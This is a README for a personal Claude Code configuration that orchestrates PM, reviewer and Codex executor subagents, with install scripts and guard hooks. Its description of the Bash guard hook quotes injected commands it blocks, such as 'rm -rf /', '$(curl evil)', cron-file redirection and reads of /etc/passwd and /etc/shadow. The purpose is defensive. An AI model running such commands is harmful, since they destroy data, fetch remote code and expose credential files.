# pm-dispatch
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE) [![Version](https://img.shields.io/badge/version-v0.2.0-blue.svg)](https://github.com/screenleon/pm-dispatch/releases/tag/v0.2.0)

Personal Claude Code configuration for forks: subagents, slash commands, skills, and dispatch scripts with a stable installer.

This repository is designed for a single maintainer working on their own adaptation. It is source-available for reading and forking, while remaining explicitly private-maintainer scoped for this operational track.

## Documentation

**Start here**
- [Getting started](docs/GETTING_STARTED.md) — install, verify, first `/pm` run
- [Core concepts](docs/CONCEPTS.md) — the orchestration model and why it is shaped this way

**Reference**
- [Platform support](docs/platform-support.md) — per-OS install model (symlink / copy mode)
- [Executor contract](docs/executor-contract.md) — `full` / `minimal` profile + PM handoff abstraction
- [Dispatch brief schema](docs/dispatch-brief.md) — required brief fields + `self_verify` macros
- [Model tier policy](docs/model-tier-policy.md) — sonnet-default, Opus escalation rules
- [Memory system](docs/memory-system.md) — memory persistence layer: on-disk layout and recall lifecycle
- [pr-gate handover schema](docs/pr-gate-handover-schema.md) — `pr-gate-handover_v1` block format (claude-executor fan-out)

## Working language

Primary working language is Mandarin Chinese. Commit messages and code identifiers are
English. Issue threads may be bilingual; non-Mandarin contributors are welcome and should
expect bilingual responses.

## Path placeholders

Examples use `${PM_DISPATCH_REPO}` to refer to your local clone root. If unset, `scripts/install-hooks.sh` derives it automatically from the git toplevel with:

`repo_root="${PM_DISPATCH_REPO:-$(cd "$(dirname "$0")/.." && pwd)}"`

## Layout

```
agents/      → ~/.claude/agents/    subagents callable via the Agent tool
commands/    → ~/.claude/commands/  /slash commands
scripts/                            hook wrappers (called by absolute path) + usage tracking scripts
             → ~/.claude/scripts/   token-usage.sh and log-usage.sh are symlinked here by install.sh
pm/          → ~/.claude/.pm/       cross-repo PM schema, scripts, templates
settings/                           settings fragments to merge into ~/.claude/settings.json by hand
docs/                               guides, schemas, and policy documents
```

## pm-schema (`pm/`)

Cross-repo project-management schema and tooling consumed by `project-pm` and BACKLOG.md / DECISIONS.md authoring across the user's repos. `install.sh` symlinks `~/.claude/.pm/` to this directory so canonical path references (e.g., the `rollup.sh --out` default, prose mentions in memory) keep working.

Contents:
- `schema.md` — pm-schema v1.2 definition.
- `templates/{BACKLOG,DECISIONS}.md` — bootstrap templates.
- `scripts/rollup.sh`, `scripts/validate.sh` — portable shell tooling (pure stdlib).
- `scripts/test/` — fixture-driven test suite for the scripts above.

Runtime artifacts (`.agent-trace/`, `rollup/PORTFOLIO.md`) are gitignored.

### Cutover (one-time, manual)

The canonical PM path is now `~/.claude/.pm/`, installed as a symlink to `pm-dispatch/pm/`.

1. `bash ~/github/pm-dispatch/install.sh`
   — Expected: `link $HOME/.claude/.pm -> .../pm-dispatch/pm`. Exit code 0.
2. `readlink ~/.claude/.pm`
   — Should print the path under `pm-dispatch/pm/`. If it doesn't, stop; do not use rollup.sh / validate.sh until the symlink is confirmed.

Legacy PM directories or symlinks under the old `github` checkout location are not used by the installer. If one is present, `install.sh` leaves it untouched and emits no warning about it; inspect and remove it manually only after confirming all active references use `~/.claude/.pm`.

## Install

**Prerequisite**: `jq` must be on `$PATH`. Install: Linux/WSL2 `sudo apt install jq`, macOS `brew install jq`, Windows `winget install jqlang.jq`.

```sh
./install.sh --dry-run                # preview
./install.sh                          # apply (auto-detect profile)
./install.sh --profile minimal        # claude-only setup; skip codex hooks
./install.sh --profile full           # explicit codex setup
```

Idempotent — re-run safely after adding files. Per-file symlinks so other tools' agents in `~/.claude/agents/` are not clobbered. If a destination already exists and is not our symlink, it is skipped with a CONFLICT warning.

On platforms without symlink support (Windows Git Bash), the installer falls back to **copy mode**: managed directories are created as directory junctions and helper scripts are copied — re-run `install.sh` after `git pull` to refresh changed copies. See [`docs/platform-support.md`](docs/platform-support.md) for the per-platform install model.

**Profile**: `full` wires every hook including the codex-* guards (use when you run the [Codex CLI](https://github.com/openai/codex) for dispatch). `minimal` skips the codex-* guards (use when you only use Claude Code; the `claude` executor handles dispatch). Auto-detect runs `command -v codex` — if found, `full`; otherwise `minimal`. See [docs/executor-contract.md](docs/executor-contract.md) for the executor profile model.

After installing, verify the environment is healthy:

```sh
bash scripts/doctor.sh
```

`doctor.sh` checks that `claude` and `jq` are on `$PATH`, hooks are wired into `~/.claude/settings.json`, the memory directory exists, scripts are executable, and frontmatter passes lint — each failing check prints a concrete remediation command.

## Testing

```bash
bash scripts/run-all-tests.sh         # run all suites (test-codex-dispatch auto-skips when Codex is absent)
bash scripts/run-all-tests.sh --list  # show registered suites without running
bash scripts/run-all-tests.sh --skip test-codex-dispatch  # skip one suite
```

Requires a complete developer checkout — any registered suite that is missing or
not executable causes the aggregator to exit non-zero. Use `--skip <name>` to
opt out of environment-specific suites (e.g., `test-codex-dispatch` if the Codex
CLI is not installed).

`install.sh --verify` delegates to this script.

## What's here

### Agents

**Orchestration**
- **project-pm** — PM across `~/github/` repos. Triages requests, decomposes work, writes briefs (main thread dispatches), synthesizes PR-gate reviews, maintains per-project memory at `~/.claude/projects/<claude-project-id>/memory/project_<repo>.md`.
- **codex-executor** — Thin wrapper subagent, dispatched by the main thread. Accepts a complete brief, calls Codex via `scripts/codex-dispatch.sh`, verifies via `git diff`, reports back.

**Reviewers (advisors — PM may override with reasoning)**
- **critic** — Adversarial review of plan / diff. Scope creep, incompleteness, convention drift.
- **architecture-reviewer** — Layer / coupling / abstraction fit. Does the change respect the existing design.

**Reviewers (HARD GATES — only the user can override a `block`)**
- **security-reviewer** — OWASP-style security review for any implementation change. Auth, injection, secrets, deps, deserialization, etc.
- **risk-reviewer** — Blast radius, reversibility, migration safety, fail mode, observability. Distinct from security.
- **qa-tester** — Owns the testing phase. Loads `${QA_RULES_DIR}/${QA_RULES_ENTRY:-AGENT.md}` as Tier 1 source of truth for test categories, layer choice, and anti-patterns. Red-line violations are blocking. Any QA rules directory with a Tier 1 entry point works; set `QA_RULES_DIR` and optionally `QA_RULES_ENTRY` to use your own.

> **Project ID** in memory paths is derived from the sanitized absolute path of your working directory. Run `ls ~/.claude/projects/` to find the directory name on your machine.

### Commands

- **/pm `<request>`** — Routes a free-form request to the `project-pm` agent.
- **/pr-gate `[context]`** — Explicitly runs the full review pipeline before opening a PR.

### Model tier policy

All reviewer agent spawns use `model: "sonnet"` by default. Opus is only used
when all three escalation conditions hold (full tier + diff > 1000 lines +
sensitive path). See [`docs/model-tier-policy.md`](docs/model-tier-policy.md)
for the full decision rules, implementation-task guidance, and token tracking
usage.

### External dependencies

- **QA rules directory** (`$QA_RULES_DIR`, default `~/github/qa-testing-rules/`). Any directory with an `AGENT.md` Tier 1 entry point works — the [`qa-testing-rules`](https://github.com/screenleon/qa-testing-rules) repo is the reference implementation, but you can substitute your own. Set `QA_RULES_ENTRY` to override the entry point filename if your rules repo uses a different convention.

### Scripts

- **codex-dispatch.sh** — Invokes `codex exec` with tracing, sandbox/approval flags, timeout (default 1200s, override via `--timeout`, `$CODEX_DISPATCH_TIMEOUT`, or `~/.pm-dispatch/config` key `dispatch.default_timeout`), file-first dispatch via `--brief-file <path>`, and final-message capture. Inline `-- <brief>` is retained only for trivial smoke checks; real briefs should be written to a file to avoid shell quoting, hook-validation, and multiline prompt failures. Writes `.agent-trace/codex-<ts>.{jsonl,last,stderr}` and refreshes `.agent-trace/latest.{jsonl,last,stderr}` symlinks so observers can attach without knowing the timestamp. Exit 124 = hit the timeout (silent codex hang most likely cause). `~/.pm-dispatch/config` is optional and user-managed only; the installer never creates it. Current supported keys are `dispatch.default_timeout` and reserved `dispatch.default_model` (reserved for future default-model support).
- **codex-watch.sh** — Tails `.agent-trace/latest.jsonl` and prints a one-line human summary per event (`[turn.started]`, `[cmd] exit=0 …`, `[msg] …`, `[turn.completed] tokens: …`). Run from another terminal during a long dispatch to see real-time progress.
- **hook-pm-write-guard.sh** — `PreToolUse` hook (matcher `Edit|Write`). Blocks `project-pm` from editing/writing outside `~/.claude/projects/<claude-project-id>/memory/`. Asserts absolute paths and normalizes `..`. No-op for any other agent or the main thread. Bypass (logged): `CLAUDE_HOOK_PM_GUARD=off`. Requires `jq` and `realpath`.
- **hook-codex-bash-guard.sh** — `PreToolUse` hook (matcher `Bash`). Defends against accidental and prompt-injected misuse of `codex-executor`. Layers, in order:
  1. Reject any command containing shell composition / substitution / redirection metacharacters: `; & | $ \` ( ) < > { } \` or `CR` / `LF`. Also reject `"` and `'` (the tokenizer doesn't honor quoting; rejecting them prevents `cat "/etc/passwd"` from skipping path validation). Closes `git status; rm -rf /`, `git $(curl evil)`, `git status >/etc/cron.d/x`, `cat <(...)`, etc.
  2. Allow only one of: the canonical `codex-dispatch.sh` path; one of the read-only verbs `cat ls head tail wc grep pwd realpath dirname basename jq test sleep date echo true false`; or `git`.
  3. For `git`, only `status log diff show rev-parse ls-files describe` (always read-only), plus `branch` and `stash` (gated separately) are accepted as subcommands. `branch` rejects destructive flags (`-d/-D/--delete/-m/-M/--move/-c/-C/--copy/-f/--force/...`). `stash` only allows the explicit subverbs `list` and `show` — bare `git stash` (mutating push) and `drop/pop/clear/push/apply/...` are denied. Any git invocation with `--output*`, `--out-file*`, or `--output-directory*` is denied. Only the forms `git <subcmd>` and `git -C <dir> <subcmd>` are accepted; `git -c key=val` and `git --git-dir=...` are denied. The `<dir>` of `git -C` is itself path-validated against read roots.
  4. Every positional (non-flag) arg goes through path-validation: paths starting with `/` must resolve under one of `$CLAUDE_HOOK_CODEX_READ_ROOTS` (default `$HOME/github:/tmp`); paths starting with `~` are denied outright; any arg containing `..` as a path segment is denied (closes `cat ../etc/passwd`); glob chars (`* ? [ ]`) anywhere are denied. The VALUE part of `--flag=VALUE` forms gets the same validation (closes `grep --file=/etc/shadow x`), and dispatch `--brief-file VALUE` / `--brief-file=VALUE` values are explicitly validated the same way.
  
  Bypass (logged): `CLAUDE_HOOK_CODEX_GUARD=off` (literal "off" only). Requires `jq` and `realpath`.
- **hook-codex-write-guard.sh** — `PreToolUse` hook (matcher `Edit|Write`). Prevents codex-executor subagents from writing files outside `/tmp/brief-*.md` (enforces pre-write-by-main-thread discipline). Bypass (logged): `CLAUDE_HOOK_CODEX_WRITE_GUARD=off`. Requires `jq` and `realpath`.
- **hook-save-rate-limits.sh** — `StatusLine` hook that saves Claude rate-limit payloads to `~/.claude/rate-limits.json` for `token-usage.sh --remaining`. If a previous `statusLine.command` existed during install, it is saved to `~/.claude/statusline-chain.conf` and invoked after the rate-limit file is updated.
- **install-hooks.sh / uninstall-hooks.sh** — Idempotent `jq`-based splice into `~/.claude/settings.json`. `--dry-run` shows the diff without applying. Each apply backs up `settings.json` to `settings.json.bak.<timestamp>`.
- **test-hooks.sh** — Regression suite for the managed hook scripts (~200+ cases: happy paths, boundary, per-metachar isolated coverage, quote / `..` / glob / read-root / git -C / `--flag=path` bypass attempts, destructive git, stash subverbs, audit-log content assertions, env-var bypass, type-confusion, and StatusLine rate-limit capture). Exit 0 on all pass. `VERBOSE=1` prints every case. Run by `install.sh` and isolates audit logs via `CLAUDE_HOOK_LOG_DIR`.
- **lint-scripts.sh** — Hygiene check for `scripts/*.sh`: executable bit, shebang, `bash -n` parses, has a `set -...` line. Run by `install.sh`.
- **lint-frontmatter.sh** — Validates YAML frontmatter in `agents/`, `commands/`, and `skills/` against PyYAML flow-collection semantics (dq-escape whitelist, adjacent-quote, tab-indent, and empty-entry detection across all four collection paths). Run by CI and `doctor.sh`.
- **run-all-tests.sh** — Standalone test aggregator: runs every registered suite and prints one pass/fail summary. `install.sh --verify` runs it as a preflight; `--list` and `--skip <name>` are available.
- **doctor.sh** — Environment health check: verifies `claude`/`jq` are on `$PATH`, hooks are wired into `~/.claude/settings.json`, the memory directory exists, scripts are executable, and frontmatter passes lint. `--profile minimal|full|auto` scopes which hook checks apply. Each failing check prints a concrete remediation command.
- **token-usage.sh** — Multi-pool token usage estimator (Claude / Codex / Spark). Reads `~/.claude/usage-tracker.jsonl`. Symlinked to `~/.claude/scripts/token-usage.sh` by `install.sh`. Usage: `bash ~/.claude/scripts/token-usage.sh [--today|--all]`. `--remaining` (no arg) auto-reads `~/.claude/rate-limits.json` if the StatusLine hook is installed; `--remaining N` accepts manual dashboard value.
- **log-usage.sh** — Appends one entry to `~/.claude/usage-tracker.jsonl`. Symlinked to `~/.claude/scripts/log-usage.sh` by `install.sh`. Usage: `bash ~/.claude/scripts/log-usage.sh <type> <tokens> [note]`. Call after any significant agent operation; standard types in the script header.
- **usage-weekly.sh** — Weekly Markdown report from `~/.claude/stats-cache.json` (Claude internal cache) and Codex session JSONL files. Read-only. Run manually or from a cron job.

**Dependencies (runtime):** `jq` and `realpath` (coreutils) must be on `$PATH`. Hooks fail closed (`exit 2`) if either is missing — they log to stderr and Claude Code surfaces the message.

**Audit log:** every hook firing that targets the matched subagent appends one line to `$CLAUDE_HOOK_LOG_DIR/hooks.log` (default `~/.claude/logs/hooks.log`). No-ops for other agents are not logged. Format: `<ISO8601> <hook-name> agent=<type> tool=<name> decision=<allow|deny|bypass> reason=<...> target=<path-or-cmd>`. `reason` and `target` are `printf %q`-escaped so the log is safely re-parseable. The `CLAUDE_HOOK_LOG_DIR` env var lets the test suite redirect to a sandbox dir without polluting the live log.

**Rollback:** to disable hooks system-wide, run `scripts/uninstall-hooks.sh` (creates a backup, splices out PreToolUse entries pointing at this repo). To restore a specific prior settings file, copy from `~/.claude/settings.json.bak.<timestamp>`. The hook scripts in this repo are inert without the settings.json wiring.

## Design notes

- **Subagents cannot spawn subagents.** Claude Code intentionally restricts nested `Agent` tool calls regardless of frontmatter declaration ([Agent SDK docs](https://code.claude.com/docs/en/agent-sdk/subagents.md)). The **main thread** orchestrates: it spawns subagents (PM, reviewers, codex-executor) and relays outputs between them. PM produces briefs and synthesizes verdicts; it does not dispatch. Reviewers run in parallel from the main thread, not from PM. Never include `Agent` in any subagent's `tools:` frontmatter — `scripts/lint-agents.sh` enforces this.
- **Hooks enforce hard rules; prose alone leaks.** CLAUDE.md compliance for "never do X" rules sits around 70% in the public research, so structural enforcement matters for invariants. Three `PreToolUse` hooks live in `~/.claude/settings.json`: `hook-pm-write-guard.sh` (project-pm can only Edit/Write inside the memory dir), `hook-codex-bash-guard.sh` (codex-executor's Bash is restricted to the dispatch script + a read-only verb allowlist, with metacharacter rejection up front), and `hook-codex-write-guard.sh` (codex-executor can only Edit/Write `/tmp/brief-*.md`). All no-op for the main thread and other subagents.
  - **Threat model**: defends against accidental misuse and prompt-injected misuse by the targeted subagent. Specifically *not* a defense against the user's main thread, which has full tool access by design.
  - **Failure mode**: fail-closed on missing `jq`/`realpath`, malformed input JSON, or empty/non-absolute paths. Fail-open (no-op) only when the firing agent is not the targeted subagent, or when the bypass env var is the literal string `off` (anything else, including empty string and case variants, does not bypass — bypasses are logged).
  - **Bypass**: `CLAUDE_HOOK_PM_GUARD=off` / `CLAUDE_HOOK_CODEX_GUARD=off` / `CLAUDE_HOOK_CODEX_WRITE_GUARD=off`. Each bypass appends a line to `~/.claude/logs/hooks.log`.
  - **Tests**: `scripts/test-hooks.sh` exercises ~150+ cases including per-metacharacter isolation, quoted-path / `..`-traversal / `git -C` / `--flag=PATH` / bundled-short-flag (`-rf/path`, `-n5/path`) bypass attempts, destructive-git forms, and audit-log content assertions. Run by `install.sh` with audit logs sandboxed via `CLAUDE_HOOK_LOG_DIR`.
  - **Known overrestriction**: short-flag-attached values containing `/` after letter/digit chars are treated as paths and validated against read roots — so `grep -ipath/to/regex` is denied even when `path/to/regex` is intended as a regex pattern, not a file. Workaround: pass the pattern as a separate token (`grep -i path/to/regex file`) or use `-e` / positional form. Same for paths with embedded `/` that legitimately need to escape the read root: use the bypass env var.
- **PM thinks, Codex implements.** `project-pm` writes the brief; `codex-executor` is a dispatcher, not a designer. Architecture, scope, and acceptance criteria stay with the PM.
- **Definitions in repo, state on disk.** Agent and command definitions are version-controlled here. Per-project state (memory, traces) lives in `~/.claude/` and stays out of this repo.
- **Decoupled from agent-playbook-template.** The playbook is a methodology framework; this repo is a personal config. They evolve independently.

## License

MIT. See [`LICENSE`](LICENSE).

## Adding new pieces

- New agent: drop a `name.md` (with frontmatter) into `agents/`, re-run `install.sh`. **Don't include `Agent` in `tools:`** — `scripts/lint-agents.sh` will reject the install.
- New command: drop a `name.md` into `commands/`, re-run `install.sh`.
- New hook: drop a `scripts/hook-<name>.sh` and add a corresponding `PreToolUse` entry by re-running `scripts/install-hooks.sh` (extend the splice if it's a new pair); don't hand-edit `settings.json` if it can be avoided. Add test cases to `scripts/test-hooks.sh` — security-relevant scripts ship with regression coverage.
- Settings allowlist additions: edit `~/.claude/settings.json` directly; don't try to symlink settings.

## Codex briefs

Schema and reusable self-verify macros: [`docs/dispatch-brief.md`](docs/dispatch-brief.md). All briefs dispatched to `codex-executor` must include `working_dir`, `goal`, `files`, and `acceptance`; the executor rejects briefs missing those fields.

- `self_verify` — **required for file-writing briefs** (any brief whose `files:` block contains an entry tagged `write:` or `new:`, or any entry without an explicit `read:` tag; when in doubt, treat as file-writing). Optional only for read-only briefs where *every* `files:` entry is explicitly tagged `read:`. See [`docs/dispatch-brief.md`](docs/dispatch-brief.md) for the canonical definition.

### Watching a long dispatch

Codex briefs that touch many files can run 10–30 minutes. The `codex-executor` subagent blocks until codex returns, so the parent agent has no incremental view. Two recovery patterns:

1. **External tail (any session, no Claude Code involvement).** From another terminal:
   ```sh
   ~/github/pm-dispatch/scripts/codex-watch.sh --cd /path/to/project
   ```
   Prints one line per codex event as it streams. Works whether the dispatcher was launched from Claude Code, the CLI, or a CI job.

2. **Background dispatch from main thread.** When you need progress visible *inside* a Claude Code session, skip `codex-executor` and run the wrapper as a background Bash command, then `Monitor` (or periodically `Bash` with `tail -n 5 .agent-trace/latest.jsonl`) the trace file. Invoke `codex-executor` only at the end for `git diff` verification. Trade-off: you lose the executor's pre-dispatch brief validation, so write the brief carefully.

If a dispatch exits 124, codex hit the timeout — almost always a silent startup hang. The wrapper banner + closing line in `.agent-trace/latest.stderr` is the post-mortem: re-dispatching usually clears the hang. Extend `--timeout` (or `$CODEX_DISPATCH_TIMEOUT`) only when codex is genuinely doing more work than the default 20 minutes.

---

## Disclaimer

Claude Code is a product of [Anthropic](https://www.anthropic.com/). This project is an independent personal configuration for Claude Code and is **not affiliated with, sponsored by, or endorsed by Anthropic**. "Claude" and "Claude Code" are trademarks of Anthropic; references in this repository are descriptive use only.

Similarly, [Codex CLI](https://github.com/openai/codex) is a product of OpenAI; this project integrates with it but is not affiliated with OpenAI.
